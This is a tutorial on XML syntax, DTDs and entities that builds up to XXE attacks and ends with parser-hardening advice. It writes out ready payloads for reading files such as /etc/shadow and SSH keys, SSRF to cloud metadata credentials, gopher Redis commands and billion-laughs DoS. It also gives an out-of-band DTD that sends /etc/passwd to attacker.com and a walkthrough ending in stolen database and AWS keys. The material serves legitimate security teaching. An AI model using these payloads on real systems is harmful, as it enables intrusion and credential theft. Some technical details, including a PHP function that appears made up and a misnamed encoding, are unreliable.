# XML Entities - Comprehensive Guide

Based on PortSwigger Web Security Academy and XML specification fundamentals

XML entities are a fundamental feature of the XML specification that allows representing data items symbolically within XML documents rather than literally. While designed for legitimate purposes like encoding special characters and reusing content, entities—particularly external entities—create significant security vulnerabilities when XML parsers process untrusted input. Understanding XML entities is essential for comprehending XXE (XML External Entity) vulnerabilities, as external entities provide the primary attack vector by allowing XML documents to reference and include content from files, URLs, or other external resources during parsing.

The foundation: **XML entities are placeholders that get replaced with actual content during parsing**—attackers exploit this mechanism to inject malicious content.

> Only test systems you own or are explicitly authorized to assess.

## What is XML? (fundamentals)

### XML overview

**XML = Extensible Markup Language**

**Purpose:** Store and transport data in a structured, human-readable format.

**Basic XML document:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<bookstore>
    <book category="fiction">
        <title>The Great Gatsby</title>
        <author>F. Scott Fitzgerald</author>
        <year>1925</year>
        <price>10.99</price>
    </book>
    <book category="non-fiction">
        <title>A Brief History of Time</title>
        <author>Stephen Hawking</author>
        <year>1988</year>
        <price>15.99</price>
    </book>
</bookstore>
```

### XML vs. HTML

**Similarities:**
- Both use tag-based structure: `<tag>content</tag>`
- Both form tree hierarchies (parent/child relationships)
- Both use attributes: `<tag attribute="value">`

**Key differences:**

**HTML - Predefined tags:**
```html
<html>
    <head><title>Page Title</title></head>
    <body>
        <h1>Heading</h1>
        <p>Paragraph</p>
    </body>
</html>
```

Tags like `<html>`, `<head>`, `<body>`, `<p>` are predefined in HTML specification.

**XML - Custom tags:**
```xml
<company>
    <employee>
        <name>John Smith</name>
        <salary>75000</salary>
    </employee>
</company>
```

Tags like `<company>`, `<employee>`, `<salary>` are defined by document creator.

**Purpose difference:**
- HTML: Display data (presentation)
- XML: Store/transport data (data structure)

### XML structure components

**XML Declaration (optional):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
```

Specifies XML version and character encoding.

**Root Element (required):**
```xml
<root>
    <!-- All other elements must be nested inside root -->
</root>
```

Every XML document must have exactly one root element.

**Elements:**
```xml
<person>
    <name>Alice</name>
    <age>30</age>
</person>
```

Elements contain data and can be nested.

**Attributes:**
```xml
<book isbn="978-0-123456-78-9" language="en">
    <title>Example Book</title>
</book>
```

Attributes provide metadata about elements.

**Comments:**
```xml
<!-- This is a comment -->
<data>Content</data>
```

**CDATA sections (unparsed data):**
```xml
<script>
<![CDATA[
    if (a < b && c > d) {
        // This < and > won't be parsed as XML tags
    }
]]>
</script>
```

CDATA sections contain data that should not be parsed.

### XML syntax rules

**Well-formed XML requirements:**

**1. Must have closing tags:**
```xml
<!-- Correct -->
<name>John</name>

<!-- Incorrect -->
<name>John
```

**2. Tags are case-sensitive:**
```xml
<!-- Incorrect - mismatched case -->
<Name>John</name>

<!-- Correct -->
<Name>John</Name>
```

**3. Must be properly nested:**
```xml
<!-- Incorrect -->
<person><name>John</person></name>

<!-- Correct -->
<person><name>John</name></person>
```

**4. Attribute values must be quoted:**
```xml
<!-- Incorrect -->
<book category=fiction>

<!-- Correct -->
<book category="fiction">
```

**5. Special characters must be escaped:**
```xml
<!-- Incorrect -->
<message>x < y && a > b</message>

<!-- Correct -->
<message>x &lt; y &amp;&amp; a &gt; b</message>
```

### Historical context: XML vs. JSON

**Early 2000s - XML dominance:**
```
AJAX = Asynchronous JavaScript And XML
SOAP = Simple Object Access Protocol (uses XML)
RSS/Atom feeds = XML-based
Configuration files = XML (web.config, pom.xml)
```

**Example AJAX with XML:**
```javascript
// XMLHttpRequest (2000s)
var xhr = new XMLHttpRequest();
xhr.open('GET', '/api/users');
xhr.onload = function() {
    var xmlDoc = xhr.responseXML;
    var users = xmlDoc.getElementsByTagName('user');
    // Process XML...
};
xhr.send();
```

**Modern era - JSON preference:**
```
JSON = JavaScript Object Notation
REST APIs = Primarily use JSON
Configuration = JSON (package.json, settings.json)
Data exchange = JSON
```

**Example modern API with JSON:**
```javascript
// Fetch API (modern)
fetch('/api/users')
    .then(response => response.json())
    .then(users => {
        // Process JSON array directly
        users.forEach(user => console.log(user.name));
    });
```

**Why JSON won:**

**Simplicity - JSON:**
```json
{
    "name": "John",
    "age": 30,
    "active": true
}
```

**vs. XML:**
```xml
<person>
    <name>John</name>
    <age>30</age>
    <active>true</active>
</person>
```

**JavaScript integration - JSON:**
```javascript
var obj = JSON.parse('{"name":"John"}');
console.log(obj.name); // Direct access
```

**vs. XML:**
```javascript
var parser = new DOMParser();
var xmlDoc = parser.parseFromString(xmlString, 'text/xml');
var name = xmlDoc.getElementsByTagName('name')[0].textContent; // Verbose
```

**Security - JSON:**
- Simpler specification
- Fewer dangerous features
- No external entity resolution
- Lower attack surface

**vs. XML:**
- Complex specification with many features
- External entities (XXE vulnerability)
- DTD processing complexity
- Larger attack surface

## What are XML entities?

### Built-in entities (predefined)

**Purpose:** Represent special characters that have meaning in XML syntax.

**Five predefined entities:**

| Character | Entity | Usage |
|-----------|--------|-------|
| `<` | `&lt;` | Less than (start tag) |
| `>` | `&gt;` | Greater than (end tag) |
| `&` | `&amp;` | Ampersand (entity marker) |
| `'` | `&apos;` | Apostrophe (attribute delimiter) |
| `"` | `&quot;` | Quotation mark (attribute delimiter) |

**Why entities are needed:**

**Problem - Special characters in content:**
```xml
<message>if (x < 10 && y > 5) then...</message>
```

**Parser interpretation:**
```
Parser sees: <message>if (x
Then sees: < 10 && y >
Thinks: "<10" is a tag! Error: Invalid tag name "10"
```

**Solution - Use entities:**
```xml
<message>if (x &lt; 10 &amp;&amp; y &gt; 5) then...</message>
```

**Parser interpretation:**
```
Parser sees: &lt;
Replaces with: <
Final content: "if (x < 10 && y > 5) then..."
```

### Entity syntax

**Entity reference format:**
```
&entityname;
```

**Components:**
- `&` - Entity start delimiter
- `entityname` - Entity name
- `;` - Entity end delimiter

**Examples:**

**Text content with entities:**
```xml
<formula>a &lt; b &amp;&amp; c &gt; d</formula>
```

**Becomes:**
```
a < b && c > d
```

**Attribute values with entities:**
```xml
<link url="http://example.com/page?id=1&amp;sort=asc" />
```

**Becomes:**
```
url = "http://example.com/page?id=1&sort=asc"
```

**Nested entities:**
```xml
<text>Use &amp;lt; to display &lt;</text>
```

**Becomes:**
```
Use &lt; to display <
```

### Numeric character references

**Alternative to named entities: Use Unicode code points.**

**Decimal format:**
```xml
&#decimal_code;
```

**Hexadecimal format:**
```xml
&#xhex_code;
```

**Examples:**

| Character | Decimal | Hexadecimal | Named Entity |
|-----------|---------|-------------|--------------|
| `<` | `&#60;` | `&#x3C;` | `&lt;` |
| `>` | `&#62;` | `&#x3E;` | `&gt;` |
| `&` | `&#38;` | `&#x26;` | `&amp;` |
| `A` | `&#65;` | `&#x41;` | N/A |
| `©` | `&#169;` | `&#xA9;` | `&copy;` (HTML) |

**Usage:**
```xml
<copyright>&#169; 2026 Company Inc.</copyright>
```

**Renders as:**
```
© 2026 Company Inc.
```

**Security note:** Numeric references can bypass simple filters:
```xml
<!-- Filtered: -->
<script>alert('XSS')</script>

<!-- Bypass attempt: -->
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

## What is Document Type Definition (DTD)?

### DTD purpose

**DTD = Document Type Definition**

**Functions:**
1. Define valid structure of XML document
2. Specify allowed elements and attributes
3. Define data types and constraints
4. Declare custom entities
5. Provide validation rules

**Analogy:** DTD is like a "schema" or "contract" for XML documents.

### DTD location types

**Internal DTD (embedded in document):**
```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to, from, heading, body)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
<note>
    <to>Alice</to>
    <from>Bob</from>
    <heading>Reminder</heading>
    <body>Meeting at 3pm</body>
</note>
```

**External DTD (loaded from file):**
```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>Alice</to>
    <from>Bob</from>
    <heading>Reminder</heading>
    <body>Meeting at 3pm</body>
</note>
```

**note.dtd file:**
```xml
<!ELEMENT note (to, from, heading, body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

**Hybrid DTD (combination):**
```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd" [
  <!ENTITY internalEntity "Internal value">
]>
<note>
    <to>Alice</to>
</note>
```

### DTD syntax

**DOCTYPE declaration:**
```xml
<!DOCTYPE root_element SYSTEM "external.dtd">
<!DOCTYPE root_element [internal declarations]>
<!DOCTYPE root_element SYSTEM "external.dtd" [internal declarations]>
```

**Element declarations:**
```xml
<!ELEMENT element_name (content_model)>
```

**Examples:**
```xml
<!-- Element with child elements -->
<!ELEMENT person (name, age, email)>

<!-- Element with text content -->
<!ELEMENT name (#PCDATA)>

<!-- Element with mixed content -->
<!ELEMENT description (#PCDATA | bold | italic)*>

<!-- Empty element -->
<!ELEMENT br EMPTY>

<!-- Element with any content -->
<!ELEMENT div ANY>
```

**Attribute declarations:**
```xml
<!ATTLIST element_name
    attribute_name attribute_type default_value
>
```

**Examples:**
```xml
<!ATTLIST person
    id ID #REQUIRED
    country CDATA "USA"
    status (active|inactive) "active"
>
```

**Usage:**
```xml
<person id="p001" country="UK" status="active">
    <name>John</name>
</person>
```

### DTD content models

**Sequence (elements must appear in order):**
```xml
<!ELEMENT book (title, author, year, price)>
```

**Valid:**
```xml
<book>
    <title>Example</title>
    <author>Smith</author>
    <year>2020</year>
    <price>29.99</price>
</book>
```

**Choice (one element from list):**
```xml
<!ELEMENT contact (email | phone | address)>
```

**Valid (any one):**
```xml
<contact><email>user@example.com</email></contact>
<contact><phone>555-1234</phone></contact>
```

**Occurrence indicators:**

| Symbol | Meaning | Example |
|--------|---------|---------|
| (none) | Exactly once | `<!ELEMENT book (title)>` |
| `?` | Zero or one | `<!ELEMENT book (subtitle?)>` |
| `*` | Zero or more | `<!ELEMENT book (chapter*)>` |
| `+` | One or more | `<!ELEMENT book (author+)>` |

**Examples:**
```xml
<!ELEMENT book (title, subtitle?, author+, chapter*)>
```

**Valid:**
```xml
<book>
    <title>XML Guide</title>
    <!-- subtitle optional, omitted -->
    <author>Alice</author>
    <author>Bob</author>
    <chapter>Intro</chapter>
    <chapter>Advanced</chapter>
    <!-- More chapters allowed -->
</book>
```

## What are XML custom entities?

### Custom entity declaration

**Syntax:**
```xml
<!DOCTYPE root [
  <!ENTITY entity_name "entity_value">
]>
```

**Usage:**
```xml
&entity_name;
```

### Basic custom entity examples

**Example 1: Text replacement**
```xml
<?xml version="1.0"?>
<!DOCTYPE message [
  <!ENTITY company "Acme Corporation">
  <!ENTITY year "2026">
]>
<message>
    <text>Welcome to &company;!</text>
    <copyright>&copy; &year; &company;. All rights reserved.</copyright>
</message>
```

**Parsed result:**
```xml
<message>
    <text>Welcome to Acme Corporation!</text>
    <copyright>© 2026 Acme Corporation. All rights reserved.</copyright>
</message>
```

**Example 2: Avoiding repetition**
```xml
<!DOCTYPE document [
  <!ENTITY disclaimer "This document is confidential and proprietary. Unauthorized distribution is prohibited.">
]>
<document>
    <section1>
        <content>Section 1 content...</content>
        <footer>&disclaimer;</footer>
    </section1>
    <section2>
        <content>Section 2 content...</content>
        <footer>&disclaimer;</footer>
    </section2>
</document>
```

**Benefit:** Change entity definition once, updates all references.

**Example 3: Special character shortcuts**
```xml
<!DOCTYPE doc [
  <!ENTITY copyright "&#169;">
  <!ENTITY trademark "&#8482;">
  <!ENTITY registered "&#174;">
]>
<doc>
    <text>&copyright; 2026 Company&trademark;</text>
    <brand>BrandName&registered;</brand>
</doc>
```

**Result:**
```
© 2026 Company™
BrandName®
```

### Entity types

**General entities (most common):**
```xml
<!ENTITY name "value">
```

Used in document content: `&name;`

**Parameter entities (used in DTD only):**
```xml
<!ENTITY % name "value">
```

Used in DTD declarations: `%name;`

**Example with parameter entity:**
```xml
<!DOCTYPE doc [
  <!ENTITY % commonAttrs "id ID #IMPLIED class CDATA #IMPLIED">
  
  <!ELEMENT div EMPTY>
  <!ATTLIST div %commonAttrs;>
  
  <!ELEMENT span EMPTY>
  <!ATTLIST span %commonAttrs;>
]>
```

Both `<div>` and `<span>` inherit the same attributes.

### Entity limitations and security

**Recursive entity expansion (XML bomb):**
```xml
<!DOCTYPE bomb [
  <!ENTITY a "lol">
  <!ENTITY b "&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;">
]>
<bomb>&d;</bomb>
```

**Expansion:**
```
&d; = 5 × &c;
&c; = 5 × &b;
&b; = 5 × &a;
&a; = "lol"

Total: 5^3 = 125 "lol" strings
```

**Memory consumption grows exponentially with nesting depth.**

**Billion Laughs Attack (10 levels):**
```xml
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
...
<!ENTITY lol9 "&lol8;...">
```

**Result:** 10^9 (one billion) expansions → Gigabytes of memory → DoS.

## What are XML external entities?

### External entity declaration

**Syntax:**
```xml
<!ENTITY entity_name SYSTEM "URI">
<!ENTITY entity_name PUBLIC "public_id" "URI">
```

**Keywords:**
- `SYSTEM` - Specifies private (system-specific) identifier (most common)
- `PUBLIC` - Specifies public identifier (formal identifier + URI)

**SYSTEM examples:**
```xml
<!ENTITY ext SYSTEM "http://example.com/data.xml">
<!ENTITY config SYSTEM "file:///etc/config.xml">
<!ENTITY doc SYSTEM "https://api.example.com/document">
```

**PUBLIC example:**
```xml
<!ENTITY copyright PUBLIC "-//W3C//TEXT copyright//EN" "http://www.w3.org/Consortium/Legal/copyright-documents-19990405.txt">
```

### External entity with file:// protocol

**The security vulnerability: Reading arbitrary files**

**Basic file read:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**When parsed:**
```
1. Parser encounters &xxe; reference
2. Resolves entity: SYSTEM "file:///etc/passwd"
3. Reads /etc/passwd from filesystem
4. Substitutes file contents into document
5. Application processes document with file contents
```

**Result in parsed document:**
```xml
<data>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
</data>
```

**Platform-specific paths:**

**Linux/Unix:**
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/shadow">
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
```

**Windows:**
```xml
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">
```

**Relative paths:**
```xml
<!ENTITY xxe SYSTEM "file://./config/database.yml">
<!ENTITY xxe SYSTEM "file://../../../etc/passwd">
```

### External entity with http:// protocol

**The SSRF vulnerability: Making HTTP requests**

**Basic HTTP request:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal.example.com/admin">
]>
<data>&xxe;</data>
```

**When parsed:**
```
1. Parser encounters &xxe; reference
2. Resolves entity: SYSTEM "http://internal.example.com/admin"
3. Makes HTTP GET request to http://internal.example.com/admin
4. Receives response
5. Substitutes response into document
```

**Result:** Server acts as proxy to internal systems!

**SSRF targets via external entities:**

**Internal services:**
```xml
<!ENTITY xxe SYSTEM "http://localhost:8080/admin">
<!ENTITY xxe SYSTEM "http://192.168.1.100/manager">
<!ENTITY xxe SYSTEM "http://internal-api.local/users">
```

**Cloud metadata services:**
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
```

**Port scanning:**
```xml
<!ENTITY xxe SYSTEM "http://192.168.1.1:22">   <!-- SSH -->
<!ENTITY xxe SYSTEM "http://192.168.1.1:3306"> <!-- MySQL -->
<!ENTITY xxe SYSTEM "http://192.168.1.1:6379"> <!-- Redis -->
```

**Response timing distinguishes open vs. closed ports.**

### Other supported protocols

**FTP protocol:**
```xml
<!ENTITY xxe SYSTEM "ftp://internal-ftp.example.com/sensitive-data.txt">
```

**Data protocol (inline data):**
```xml
<!ENTITY xxe SYSTEM "data:text/plain;base64,SGVsbG8gV29ybGQ=">
```

**PHP wrappers (PHP environments):**
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/read=string.toupper/resource=config.php">
<!ENTITY xxe SYSTEM "expect://id">
```

**Gopher protocol (arbitrary TCP data):**
```xml
<!ENTITY xxe SYSTEM "gopher://internal-redis:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a">
```

Sends Redis commands directly!

**JAR protocol (Java):**
```xml
<!ENTITY xxe SYSTEM "jar:http://attacker.com/malicious.jar!/resource.txt">
```

**Netdoc protocol (Java, older versions):**
```xml
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
```

### Parameter entities for advanced attacks

**Parameter entity syntax:**
```xml
<!ENTITY % name "value">
```

**Used with `%name;` (instead of `&name;`)**

**Restriction:** Parameter entities only work in DTD context, not document content.

**Why parameter entities matter: Out-of-band data exfiltration**

**Attack scenario:**

**Step 1: Attacker hosts external DTD (evil.dtd):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/steal?data=%file;'>">
%eval;
%exfil;
```

**Step 2: Victim's XML references attacker's DTD:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>test</data>
```

**Execution flow:**
```
1. Parser loads http://attacker.com/evil.dtd
2. evil.dtd defines %file (reads /etc/passwd)
3. evil.dtd defines %eval (creates %exfil entity)
4. %eval; is invoked, defining %exfil
5. %exfil; is invoked, making HTTP request:
   GET /steal?data=root:x:0:0:root:/root:/bin/bash... HTTP/1.1
   Host: attacker.com
6. Attacker's server receives /etc/passwd contents
```

**Result:** File contents exfiltrated even if not returned in response (blind XXE)!

**Why this works:**
- Parameter entities can be used to construct other entities dynamically
- `&#x25;` = URL-encoded `%` (to create nested parameter entities)
- External DTD allows multi-stage entity processing
- HTTP request to attacker's server exfiltrates data

### Entity expansion limits

**Modern parsers implement protections:**

**Entity expansion limits:**
```
Default limits (approximate):
- Maximum entity expansions: 100,000
- Maximum entity depth: 10-20 levels
- Maximum entity size: 50MB
- Maximum external entities: Disabled by default (secure parsers)
```

**PHP libxml limits:**
```php
// Get current limits
libxml_get_entity_loader_limit(); // Default: 5000
```

**Java JDK limits:**
```
jdk.xml.entityExpansionLimit=64000
jdk.xml.totalEntitySizeLimit=50000000
jdk.xml.maxGeneralEntitySizeLimit=0
jdk.xml.maxParameterEntitySizeLimit=1000000
```

**Bypassing expansion limits:**
- Use external entities (load from file/HTTP instead of inline expansion)
- Chain multiple external entities
- Use parameter entities (sometimes have separate limits)

## Complete attack demonstration

### Full XXE attack walkthrough

**Scenario:** Stock checking application that accepts XML input.

**Step 1: Normal request**
```http
POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/xml
Content-Length: 118

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>381</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Response:**
```
Stock: 15 units available
```

**Step 2: Define external entity**
```http
POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>381</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Response:**
```
Stock: 15 units available
```

No change—entity defined but not used.

**Step 3: Reference entity in content**
```http
POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Response:**
```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Success!** File contents extracted.

**Step 4: Extract application secrets**
```http
POST /product/stock HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/config.php"> ]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

**Response:**
```
Invalid product ID: <?php
define('DB_HOST', 'localhost');
define('DB_USER', 'admin');
define('DB_PASS', 'P@ssw0rd123!');
define('DB_NAME', 'production_db');
?>
```

**Database credentials stolen!**

**Step 5: SSRF to cloud metadata**
```http
POST /product/stock HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

**Response:**
```
Invalid product ID: {
  "Code": "Success",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}
```

**AWS credentials compromised!**

## Prevention summary

**Disable dangerous features:**

**PHP:**
```php
libxml_disable_entity_loader(true);
```

**Java:**
```java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

**Python:**
```python
from defusedxml import ElementTree
```

**.NET:**
```csharp
settings.DtdProcessing = DtdProcessing.Prohibit;
```

**Key principle:** Disable external entity resolution unless absolutely required.

## Quick reference

**Entity types:**
- Built-in entities: `&lt;` `&gt;` `&amp;` `&apos;` `&quot;`
- Custom entities: `<!ENTITY name "value">`
- External entities: `<!ENTITY name SYSTEM "URI">`
- Parameter entities: `<!ENTITY % name "value">`

**Dangerous protocols:**
- `file://` - Read local files
- `http://` - SSRF attacks
- `php://` - PHP wrappers
- `gopher://` - Arbitrary TCP
- `data://` - Inline data

**Attack indicators:**
- `<!DOCTYPE` - DTD declaration
- `<!ENTITY` - Entity definition
- `SYSTEM` - External entity keyword
- `file://` - File access
- `%` - Parameter entity marker

XML entities provide powerful functionality for content reuse and special character handling, but external entities create severe security vulnerabilities when processing untrusted XML input. The combination of file:// protocol for filesystem access and http:// protocol for network requests transforms XML parsers into tools for arbitrary file disclosure and Server-Side Request Forgery. Understanding entity mechanics—especially the distinction between general entities, parameter entities, and external entities—is essential for both exploiting XXE vulnerabilities and implementing effective defenses through parser configuration.
